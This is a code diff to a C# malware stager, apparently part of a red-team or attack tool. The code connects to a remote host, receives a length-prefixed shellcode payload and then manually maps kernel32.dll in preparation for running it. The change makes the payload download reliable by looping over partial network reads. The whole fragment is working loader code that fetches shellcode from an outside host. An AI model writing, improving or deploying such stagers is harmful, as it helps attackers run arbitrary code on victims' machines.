@@ -33,15 +33,33 @@ namespace Stager
             client.Connect(ipEndPoint);
             NetworkStream stream = client.GetStream();
 
-            //Receive the size of the first stage payload
-            var buffer = new byte[4];
-            stream.Read(buffer, 0, buffer.Length);
-            Int32 stgrSize = BitConverter.ToInt32(buffer, 0);
-
-
-            //Receive the stager shellcode
-            byte[] buf = new byte[stgrSize];
-            stream.Read(buf, 0, buf.Length);
+             //Receive the size of the first stage payload
+             var buffer = new byte[4];
+             int readSize = 0;
+             while (readSize < 4)
+             {
+                 int bytesRead = stream.Read(buffer, readSize, 4 - readSize);
+                 if (bytesRead == 0)
+                 {
+                     throw new Exception("Connection closed before size was received.");
+                 }
+                 readSize += bytesRead;
+             }
+             Int32 stgrSize = BitConverter.ToInt32(buffer, 0);
+            
+            
+             //Receive the stager shellcode
+             byte[] buf = new byte[stgrSize];
+             int totalRead = 0;
+             while (totalRead < buf.Length)
+             {
+                 int bytesRead = stream.Read(buf, totalRead, buf.Length - totalRead);
+                 if (bytesRead == 0)
+                 {
+                     throw new Exception("Connection closed before full payload was received.");
+                 }
+                 totalRead += bytesRead;
+             }
 
             //Map kernel32.dll to memory
             PE.PE_MANUAL_MAP kern32DLL = new PE.PE_MANUAL_MAP();
